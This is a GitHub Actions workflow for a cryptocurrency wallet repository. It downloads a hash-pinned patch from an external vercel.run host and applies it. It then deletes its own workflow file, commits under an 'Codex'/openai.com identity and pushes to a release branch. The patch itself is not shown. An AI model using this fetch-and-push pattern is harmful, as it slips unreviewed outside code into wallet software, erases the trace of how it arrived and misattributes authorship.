name: Preserve verified observation checkpoint
on:
  push:
    branches:
      - release/browser-pwa-security-localization-20261025
    paths:
      - .github/workflows/import-observation-checkpoint.yml
permissions:
  contents: write
jobs:
  import-exact-checkpoint:
    if: github.repository == 'Bradvani/getyoursats-wallet'
    runs-on: ubuntu-latest
    timeout-minutes: 6
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
        with:
          ref: ${{ github.sha }}
          fetch-depth: 2
          persist-credentials: true
      - name: Preserve only the reviewed source and binary, without deployment
        env:
          BRANCH: release/browser-pwa-security-localization-20261025
          EXPECTED_BASE: 4120868a79117f7fbd610eded80dde1501e5b550
        run: |
          set -euo pipefail
          test "$(git rev-parse HEAD^)" = "$EXPECTED_BASE"
          test "$(git ls-remote origin "refs/heads/$BRANCH" | cut -f1)" = "$GITHUB_SHA"
          curl -fsSL --retry 2 --max-time 90 'https://sb-58rapjt22ovg.vercel.run/pr43-observation.patch.gz' -o /tmp/checkpoint.patch.gz
          echo '2e2ccb9f8a7460fab809354707f723ec7da1fb4b6002bbd3d5116bde298991b7  /tmp/checkpoint.patch.gz' | sha256sum --check
          gzip -dc /tmp/checkpoint.patch.gz > /tmp/checkpoint.patch
          echo 'e8f5e490f04868b2663cd33b417a2e412d3cbc8a3c0413f7237c6ee986298363  /tmp/checkpoint.patch' | sha256sum --check
          git apply --index --check /tmp/checkpoint.patch
          git apply --index /tmp/checkpoint.patch
          git rm .github/workflows/import-observation-checkpoint.yml
          test "$(git write-tree)" = '30b7a90a6edbeb95e7b9ed6eef7b8d4382a222c8'
          git diff --cached --check
          git -c user.name='Codex' -c user.email='codex@openai.com' commit -m 'feat(security): observation-only SDK sync and recipient-bound reconciliation'
          test "$(git ls-remote origin "refs/heads/$BRANCH" | cut -f1)" = "$GITHUB_SHA"
          git push origin "HEAD:refs/heads/$BRANCH"
